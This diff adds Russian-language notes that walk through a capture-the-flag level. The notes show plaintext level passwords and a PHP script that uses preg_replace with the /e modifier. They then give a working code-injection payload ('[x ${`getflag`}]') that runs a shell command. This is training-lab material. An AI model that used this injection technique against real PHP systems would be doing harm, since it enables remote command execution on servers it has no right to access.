@@ -1,0 +1,36 @@
+su level06
+viuaaale9huek52boumoomioc
+
+ls -la
+
+cat level06.php
+
+#!/usr/bin/php
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+
+запускаем бинаркник
+ ./level06
+PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
+
+просит файл в четвертой строке пхп скрипта в функцию  file_get_contents(), переменная y которая вызывается вторым аргументом preg_replace 
+
+https://php.vn.ua/manual/ru/function.preg-replace.php
+preg_replace — Выполняет поиск и замену по регулярному выражению
+
+гуглим  регулярные выражения php
+https://habr.com/ru/company/otus/blog/484048/
+http://www.madirish.net/402
+http://web.mit.edu/hackl/www/lab/turkshop/slides/regex-cheatsheet.pdf
+https://www.php.net/manual/ru/pcre.pattern.php
+http://php.net/manual/en/reference.pcre.pattern.modifiers.php
+
+создаем регулярное выражание 
+echo '[x ${`getflag`}]' > /tmp/getflag
+./level06 /tmp/getflag
+
+su level07
+wiok45aaoguiboiki2tuin6ub
